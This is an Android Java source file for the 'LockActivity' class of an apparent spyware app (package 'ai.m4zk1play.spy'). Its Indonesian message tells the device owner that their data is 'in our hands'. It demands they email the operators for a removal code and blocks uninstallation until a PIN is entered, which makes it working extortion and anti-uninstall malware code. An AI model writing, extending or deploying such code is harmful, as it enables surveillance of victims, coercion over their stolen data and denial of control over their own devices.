package ai.m4zk1play.spy;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.text.InputType;
import android.view.Gravity;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

/** Layar kunci anti-uninstall dengan PIN. */
public class LockActivity extends Activity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Keys k = Keys.read(this);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.BLACK);
        root.setGravity(Gravity.CENTER);
        root.setPadding(56, 0, 56, 0);

        TextView warn = new TextView(this);
        warn.setText("WARNING !!!");
        warn.setTextColor(0xFFFF2D55);
        warn.setTextSize(22f);
        warn.setLetterSpacing(0.2f);
        warn.setGravity(Gravity.CENTER);
        root.addView(warn);

        TextView msg = new TextView(this);
        msg.setText("Jangan mencoba menghapus APK karena data-data anda di tangan kami.\n\n"
                + "Hubungi " + k.team + "\n" + k.email + "\n\n"
                + "Untuk meminta kode penghapusan hubungi email di atas.");
        msg.setTextColor(0xFFD6DBE6);
        msg.setTextSize(13f);
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 26, 0, 34);
        root.addView(msg);

        EditText pin = new EditText(this);
        pin.setHint("kode penghapusan");
        pin.setInputType(InputType.TYPE_CLASS_NUMBER);
        pin.setTextColor(Color.WHITE);
        pin.setHintTextColor(0xFF6B7488);
        pin.setGravity(Gravity.CENTER);
        root.addView(pin);

        Button ok = new Button(this);
        ok.setText("VERIFIKASI");
        ok.setOnClickListener(v -> {
            if (pin.getText().toString().trim().equals(k.pin)) {
                Toast.makeText(this, "Kode benar. Silakan hapus aplikasi.", Toast.LENGTH_LONG).show();
                BootProvider.start(this);
                finish();
            } else {
                Toast.makeText(this, "Kode salah. Coba lagi.", Toast.LENGTH_SHORT).show();
            }
        });
        root.addView(ok);

        setContentView(root);
    }

    public static void open(Context c) {
        Intent i = new Intent(c, LockActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        c.startActivity(i);
    }
}
